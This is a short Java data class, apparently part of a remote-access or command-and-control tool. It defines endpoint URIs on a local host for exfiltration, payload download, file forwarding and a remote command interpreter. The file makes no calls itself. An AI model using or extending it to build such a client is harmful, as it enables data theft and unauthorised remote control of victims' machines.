package modules.auxiliary;

import java.net.URI;

/**
    Data class listing all endpoints of the API.

    @author Str1k3r
    @version 1.0
*/
public class Endpoint {

    private static final String baseURL = "http://api.version1.local";

    public static URI exfiltration() {
        return URI.create(
                String.format("%s/exfiltration", baseURL)
        );
    }

    public static URI payload() {
        return URI.create(
                String.format("%s/base/payload", baseURL)
        );
    }

    public static URI cmdRequest() {
        return URI.create(
                String.format("%s/cmdInterpreter/request", baseURL)
        );
    }

    public static URI cmdResult() {
        return URI.create(
                String.format("%s/cmdInterpreter/result", baseURL)
        );
    }

    public static URI fileUpload() {
        return URI.create(
                String.format("%s/exfiltration/forward", baseURL)
        );
    }

    public static URI connection() {
        return URI.create(
                String.format("%s/cmdInterpreter/connection", baseURL)
        );
    }
}
